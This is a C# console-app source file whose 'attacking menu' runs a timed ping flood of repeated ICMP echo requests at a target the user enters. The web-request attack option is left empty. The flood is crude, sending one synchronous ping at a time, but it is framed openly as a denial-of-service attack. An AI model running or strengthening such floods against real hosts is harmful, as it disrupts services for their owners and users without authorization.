using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApp.App
{
    internal class Attacking
    {
        #region networking menu/options

        public static readonly string MenuName = "attacking menu";

        public static readonly List<string> MenuOptions = new()
        {
            "run repeated [p]ings for a duration",
            "run repeated [w]eb requests",
            "[c]lose this menu"
        };

        public static bool MenuSelector(Char selection)
        {
            bool closeMenu = false;
            switch (selection)
            {
                case 'p': // test ping a ip or url
                    RunPingDurationAttack();
                    break;

                case 'w': // get ping diagnostics
                    
                    break;

                case 'c': // close menu
                    closeMenu = true;
                    break;

                default: // invalid choice
                    Console.WriteLine("invalid selection. please try again");
                    break;
            }

            Console.WriteLine();

            return closeMenu;
        }

        #endregion

        #region callable actions from menu

        private static void RunPingDurationAttack()
        {
            Console.WriteLine("you have chosen a durated ping attack");
            Thread.Sleep(2000);

            string pingTarget = Networking.GetTarget(false);
            double durationInMinutes = GetDurationInMinutes();

            Console.Clear();
            Console.WriteLine("you have selected the following target: " + pingTarget + " | attack will run for " + durationInMinutes.ToString() + " minutes");
            Console.WriteLine("checking if target is pingable... ");

            bool targetPingable = Networking.DoesPingSucceed(pingTarget);
            if (targetPingable)
            {
                bool termsAndCondition = false;

                Console.WriteLine("success! target is pingable");
                Console.WriteLine("attack may begin, this is the last chance to cancel until the attack completes (or you close the app)");

                do
                {
                    Console.WriteLine();
                    Console.WriteLine("press [y] to continue or [n] to cancel");
                    char choice = Console.ReadKey().KeyChar;
                    Console.WriteLine();

                    switch (choice)
                    {
                        case 'y':
                            termsAndCondition = true;
                            TermsAccepted("beginning attack");
                            RunPingAttack(pingTarget, durationInMinutes);
                            break;
                        case 'n':
                            termsAndCondition = true;
                            TermsDeclined();
                            break;
                        default:
                            Console.WriteLine("invalid selection. please try again");
                            break;
                    }


                } while (!termsAndCondition);
            }
            else
            {
                Console.WriteLine("error: target is unreachable. cancelling attack");
                Console.WriteLine();
                Console.WriteLine("press any key to return to menu");
                Console.ReadKey();
                Console.Clear();
            }
        }

        #endregion
        
        private static double GetDurationInMinutes()
        {
            Console.Clear();

            string tryDuration;
            double durationInMinutes;
            bool validDuration = false;

            do
            {
                Console.Write("please enter the attack duration in minutes: ");
                tryDuration = Console.ReadLine();

                if (double.TryParse(tryDuration, out durationInMinutes))
                {
                    validDuration = true;
                }
                else
                {
                    Console.WriteLine("invalid duration. input may only be a decimal or whole number");
                }


            } while (!validDuration);

            return durationInMinutes;
        }

        private static bool RunPing_GetStatus(string nameOrAddress)
        {
            bool isPingSuccess = false;

            Ping pingSender = new();
            PingOptions pingOptions = new();

            // use a TTL value of 128 but w/ different fragmentation
            pingOptions.DontFragment = true;
            pingOptions.Ttl = 128;

            // create a buffer of 32 bytes and timeout of 120 ms
            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            byte[] buffer = Encoding.ASCII.GetBytes(data);
            int timeout = 120;

            // Add the options to the ping sender and save to a ping reply
            PingReply reply = pingSender.Send(nameOrAddress, timeout, buffer, pingOptions);

            if (reply.Status == IPStatus.Success)
                isPingSuccess = true;

            return isPingSuccess;
        }

        private static void RunPingAttack(string target, double duration)
        {
            int iterations = 0;
            DateTime attackStart = DateTime.Now;
            DateTime attackEnd = DateTime.Now.AddMinutes(duration);

            while (attackEnd >= attackStart)
            {
                iterations++;
                attackStart = DateTime.Now;

                bool pingSuccess = RunPing_GetStatus(target);
                if (!pingSuccess)
                {
                    Console.WriteLine("icmp failed");
                }
            }

            Console.WriteLine("attack completed. number of iterations: " + iterations.ToString());
        }

        private static void TermsAccepted(string msg)
        {
            Console.WriteLine("excellent - " + msg);
        }

        private static void TermsDeclined()
        {
            Console.WriteLine("no shame in canceling, returning you to menu");
        }
    }
}
